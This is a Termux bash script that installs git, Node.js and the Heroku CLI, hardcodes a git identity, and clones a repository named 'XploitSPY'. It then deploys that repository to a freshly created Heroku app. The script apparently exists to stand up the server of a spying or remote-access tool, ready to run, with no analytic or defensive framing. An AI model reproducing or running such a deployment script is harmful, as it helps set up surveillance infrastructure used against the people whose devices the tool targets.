#! /data/data/com.termux/files/usr/bin/bash
echo -e "\e[34m[*]\t\e[32mpackage update & upgrade..\e[0m";
(apt-get update;apt-get upgrade -y) > /dev/null
echo -e "\e[34m[*]\t\e[32minstalling packages..\e[0m";
(apt-get install git nodejs clang nodejs-lts -y) > /dev/null
heroku4=`which heroku`
if test -e "$heroku4" 
then
	echo -e "\e[34m[*]\t\e[32mheroku already installed..\e[0m"
else
	echo -e "\e[34m[*]\t\e[32minstalling heroku..\e[0m";
	(npm install heroku -g) > /dev/null
fi
cd
git config --global user.name "BAHUBALI"
git config --global user.email "bahubali4sivgami@gmail.com"
rm -rf ~/XploitSPY
echo -e "\e[34m[*]\t\e[32mcloning from https://github.com/remo7777/XploitSPY\e[0m";
git clone -b herooku https://github.com/remo7777/XploitSPY;
cd XploitSPY/;rm -rf .git;
echo -e "\e[34m[*]\t\e[32mplease login with heroku id & password\e[0m";
heroku login -i
echo -e "\e[34m[*]\t\e[32mcreate app on heroku..\e[0m";
heroku create $1
git init
heroku git:remote -a $1
heroku buildpacks:add heroku/jvm
heroku buildpacks:add heroku/nodejs
git add --all
git commit -am "upload"
git push --set-upstream heroku master
exit 0
